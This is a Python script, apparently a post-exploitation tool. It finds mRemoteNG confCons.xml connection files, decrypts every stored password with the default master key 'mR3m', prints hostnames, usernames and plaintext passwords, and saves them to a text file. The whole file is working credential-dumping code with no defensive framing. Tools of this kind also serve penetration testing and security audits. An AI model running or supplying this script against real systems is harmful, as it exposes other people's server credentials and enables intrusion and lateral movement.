#!/usr/bin/env python3
"""
mRemoteNG Password Decryption Tool
Decrypts all passwords from confCons.xml files in this directory
Master password: mR3m (default)
"""

import hashlib
import base64
from Crypto.Cipher import AES
import xml.etree.ElementTree as ET
import os
import glob

def decrypt_password(encrypted_data, master_password="mR3m"):
    """Decrypt a single mRemoteNG password"""
    try:
        encrypted_data = base64.b64decode(encrypted_data)
        salt = encrypted_data[:16]
        associated_data = encrypted_data[:16]
        nonce = encrypted_data[16:32]
        ciphertext = encrypted_data[32:-16]
        tag = encrypted_data[-16:]
        
        key = hashlib.pbkdf2_hmac("sha1", master_password.encode(), salt, 1000, dklen=32)
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        cipher.update(associated_data)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        
        return plaintext.decode("utf-8")
    except Exception as e:
        return f"[DECRYPT_ERROR: {str(e)}]"

def extract_passwords_from_file(config_file):
    """Extract and decrypt all passwords from a single config file"""
    results = []
    
    try:
        tree = ET.parse(config_file)
        root = tree.getroot()
        
        filename = os.path.basename(config_file)
        print(f"\n=== Processing {filename} ===")
        print(f"Master Password Hash: {root.get('Protected', 'N/A')}")
        
        # Find all nodes with passwords
        for node in root.iter():
            if node.get('Password') and len(node.get('Password', '')) > 10:
                name = node.get('Name', 'Unknown')
                hostname = node.get('Hostname', 'Unknown')
                username = node.get('Username', 'Unknown')
                domain = node.get('Domain', '')
                protocol = node.get('Protocol', 'Unknown')
                encrypted_password = node.get('Password', '')
                
                # Decrypt the password
                decrypted = decrypt_password(encrypted_password)
                
                if not decrypted.startswith('[DECRYPT_ERROR'):
                    full_username = f"{domain}\\{username}" if domain else username
                    print(f"{name} ({hostname}) | {full_username} | {decrypted} | {protocol}")
                    
                    results.append({
                        'file': filename,
                        'name': name,
                        'hostname': hostname,
                        'username': full_username,
                        'password': decrypted,
                        'protocol': protocol
                    })
                else:
                    print(f"{name} ({hostname}) | DECRYPT FAILED")
        
        return results
        
    except Exception as e:
        print(f"Error processing {config_file}: {e}")
        return []

def main():
    print("=== mRemoteNG Password Decryption Tool ===")
    print("Master Password: mR3m (default)\n")
    
    # Find all confCons.xml files in current directory
    script_dir = os.path.dirname(os.path.abspath(__file__))
    config_files = glob.glob(os.path.join(script_dir, "confCons*.xml"))
    
    if not config_files:
        print("No confCons*.xml files found in current directory!")
        return
    
    all_results = []
    
    # Process each config file
    for config_file in sorted(config_files):
        results = extract_passwords_from_file(config_file)
        all_results.extend(results)
    
    # Summary
    print(f"\n=== SUMMARY ===")
    print(f"Files processed: {len(config_files)}")
    print(f"Total passwords decrypted: {len(all_results)}")
    
    # Create credentials list
    if all_results:
        print(f"\n=== ALL CREDENTIALS ===")
        for r in all_results:
            print(f"{r['hostname']} | {r['username']} | {r['password']} | {r['protocol']}")
        
        # Save to file
        output_file = os.path.join(script_dir, "decrypted_passwords.txt")
        with open(output_file, 'w') as f:
            f.write("=== mRemoteNG Decrypted Passwords ===\n")
            f.write(f"Master Password: mR3m (default)\n")
            f.write(f"Total passwords: {len(all_results)}\n\n")
            
            for r in all_results:
                f.write(f"{r['hostname']} | {r['username']} | {r['password']} | {r['protocol']}\n")
        
        print(f"\nResults saved to: {output_file}")

if __name__ == "__main__":
    main()